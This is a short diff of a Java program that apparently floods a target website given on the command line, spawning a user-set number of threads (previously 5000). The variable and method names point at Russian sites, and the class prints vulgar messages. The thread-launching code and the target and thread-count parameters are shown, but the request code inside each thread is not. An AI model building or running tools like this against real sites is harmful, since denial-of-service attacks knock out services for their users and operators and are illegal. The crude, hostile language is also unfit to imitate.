@@ -5,17 +5,22 @@ import static java.util.Objects.nonNull;
 
 public class HeyBabe implements Runnable {
 
+    public static Integer dicksToFuckWith;
     public static String russiaPomoikaUrl;
 
     public static void main(String[] args) {
-        russiaPomoikaUrl = args[0];
-        System.out.println("Stating to fuck " + russiaPomoikaUrl);
+        System.setProperty("https.protocols", "TLSv1.1");
+
+        dicksToFuckWith = Integer.parseInt(args[0]);
+        russiaPomoikaUrl = args[1];
+
+        System.out.println("Stating to fuck " + russiaPomoikaUrl + " with " + dicksToFuckWith + " huiv");
 
         gloryToUkraine();
     }
 
     private static void gloryToUkraine() {
-        for (int i = 0; i < 5000; i++) {
+        for (int i = 0; i < dicksToFuckWith; i++) {
             final HeyBabe heyBabe = new HeyBabe();
             final Thread thread = new Thread(heyBabe);
 
